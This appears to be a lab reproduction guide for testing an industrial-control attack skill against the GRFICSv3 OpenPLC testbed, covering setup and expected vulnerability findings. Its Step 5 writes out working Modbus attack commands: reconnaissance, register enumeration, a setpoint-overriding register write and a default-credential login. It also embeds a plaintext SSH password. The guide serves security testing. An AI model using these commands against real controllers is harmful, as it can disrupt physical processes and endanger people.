# GRFICSv3 Reproduction Recipe — ics-fieldbus-attack Validation

> Step-by-step guide to reproduce the 2026-08-10 practical validation against real OpenPLC.

## Prerequisites

- macOS host (tested on darwin 25.5.0)
- Colima (any recent version)
- Docker Compose v2 plugin (`brew install docker-compose`)
- Git LFS (`brew install git-lfs`)
- Kali Linux VM with SSH access (or any attacker with `nmap` + `python3 pyModbusTCP`)
- ~2 GB free disk for Docker images
- ~30 min one-time setup

## Step 1: Configure Colima registry mirror (one-time)

Mainland China network can't reach `registry-1.docker.io` directly. Configure mirror:

```bash
colima ssh -- sudo tee /etc/docker/daemon.json <<'EOF'
{
  "registry-mirrors": [
    "https://docker.m.daocloud.io",
    "https://docker.1ms.run"
  ]
}
EOF
colima ssh -- sudo systemctl restart docker
# Verify:
docker info | grep -A 3 "Registry Mirrors"
```

## Step 2: Clone GRFICSv3 with LFS

```bash
cd /tmp
git clone https://github.com/Fortiphyd/GRFICSv3.git
cd GRFICSv3
git lfs pull  # required — simulation image needs Unity WebGL binaries (199 MB)
git lfs ls-files | head -5  # should show 4 .unityweb files
```

## Step 3: Build only the PLC image (sufficient for SKILL validation)

```bash
cd /tmp/GRFICSv3
git init -q && git add -A && git commit -q -m init && git tag v3.0.0
export BUILD_VERSION=v3.0.0-local
export BUILD_CREATED="2026-08-10T00:00:00Z"
DOCKER_BUILDKIT=1 docker compose build plc simulation router
# Expected: 3 images built (~2 GB total)
docker images | grep fortiphyd/grfics
```

Skip these builds (not needed for SKILL validation, may fail due to network):
- `attacker` (Kali desktop apt issues)
- `caldera` (mingw-w64 apt issues)
- `wazuh` (raw.githubusercontent.com unreachable)
- `ews`, `hmi` (not needed for attack validation)

## Step 4: Start OpenPLC container

```bash
docker run -d --name grfics-plc \
  -p 8080:8080 \
  -p 502:502 \
  fortiphyd/grfics-plc:latest

# Verify:
docker ps | grep grfics-plc
sleep 5  # let OpenPLC ST runtime start
docker logs grfics-plc 2>&1 | tail -10
# Should show: "Serving Flask app 'webserver'" + ST program compilation
```

## Step 5: From Kali VM, attack the OpenPLC

```bash
# SSH to VM:
sshpass -p secmind.cn ssh parallels@10.211.55.5

# Inside VM:
pip3 install --break-system-packages pyModbusTCP

# Attack 1: Reconnaissance (SKILL line 368)
nmap -p 502,8080,20000,2404,4001 -sV 10.211.55.2

# Attack 2: Modbus device discovery (SKILL line 40)
nmap --script modbus-discover -p 502 10.211.55.2

# Attack 3: Anonymous register enumeration
python3 -c "
from pyModbusTCP.client import ModbusClient
c = ModbusClient(host='10.211.55.2', port=502, timeout=5)
c.open()
print('HR[0:50]:', c.read_holding_registers(0, 50))
"

# Attack 4: Remote write (setpoint override — kinetic impact)
python3 -c "
from pyModbusTCP.client import ModbusClient
c = ModbusClient(host='10.211.55.2', port=502, timeout=5)
c.open()
print('Before:', c.read_holding_registers(0, 3))
c.write_single_register(0, 1000)  # override setpoint
print('After: ', c.read_holding_registers(0, 3))
"

# Attack 5: Default credentials (empirically discovered)
curl -i -X POST http://10.211.55.2:8080/login \
  -d "username=openplc&password=openplc"
# Expected: HTTP 302 → /dashboard

# Attack 6: Passive Modbus capture
sudo tcpdump -i any -c 8 'host 10.211.55.2 and tcp port 502' &
sleep 1
python3 -c "
from pyModbusTCP.client import ModbusClient
c = ModbusClient(host='10.211.55.2', port=502, timeout=2)
c.open(); c.read_holding_registers(0, 5); c.close()
"
wait
```

## Expected Outcome

6 vulnerabilities demonstrated:
- V1: Modbus TCP no authentication (CVSS 9.1)
- V2: Remote setpoint override — kinetic (CVSS 10.0)
- V3: Anonymous data disclosure (CVSS 7.5)
- V4: No encryption — passive capture (CVSS 7.5)
- V5: Memory disclosure (HR[12,13]=65535) (CVSS 5.3)
- V8: Default credentials `openplc:openplc` (CVSS 9.8)

Total reproduction time after one-time setup: **< 60 seconds**.

## Cleanup

```bash
docker stop grfics-plc
docker rm grfics-plc
# Optionally keep images for next validation:
# docker images | grep fortiphyd/grfics
```

## Troubleshooting

| Issue | Fix |
|-------|-----|
| `failed to resolve reference "docker.io/..."` | Apply Step 1 registry mirror |
| `git lfs pointer files detected` | Run `git lfs pull` after clone |
| `simulation build failed` | Ensure LFS files present (Step 2) |
| `nmap modbus-discover` returns `ILLEGAL FUNCTION` | This is OpenPLC's actual behavior; SKILL should document it |
| `tcpdump permission denied` | Run with sudo (enter VM password `secmind.cn`) |
| Curl to 10.211.55.2 fails from VM | Verify Parallels network (host should be at 10.211.55.2 by convention) |
